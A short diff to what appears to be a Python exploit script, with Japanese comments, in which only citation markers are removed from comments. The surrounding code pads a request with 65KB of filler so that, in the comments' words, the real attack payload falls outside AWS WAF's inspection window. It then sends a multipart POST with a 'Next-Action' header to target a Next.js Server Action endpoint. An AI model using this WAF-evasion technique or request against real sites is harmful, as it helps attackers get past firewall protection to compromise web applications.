@@ -32,7 +32,7 @@ async def get_id():
     # ----------------------------------------------------
     # WAFの検査制限（例: 64KB）を確実に超えるように、パディングサイズを定義します。
     # AWS WAFの制限は8KBから64KBの範囲であり、ここでは65KB (65536バイト)とします。
-    # これにより、実際の攻撃ペイロードはWAFの検査窓の外に配置されることが企図されます [5], [2]。
+    # これにより、実際の攻撃ペイロードはWAFの検査窓の外に配置されることが企図されます。
     padding_size = 65 * 1024  # 65KB
     padding_data = "A" * padding_size
 
@@ -72,7 +72,7 @@ async def get_id():
     # ----------------------------------------------------
     # リクエストの実行
     # ----------------------------------------------------
-    headers = {"Next-Action": "x"}  # Server Actionリクエストであることを示す [6]
+    headers = {"Next-Action": "x"}  # Server Actionリクエストであることを示す。
     res = requests.post(base_url, files=files, headers=headers, timeout=10)
     print(res.status_code)
     print(res.text)
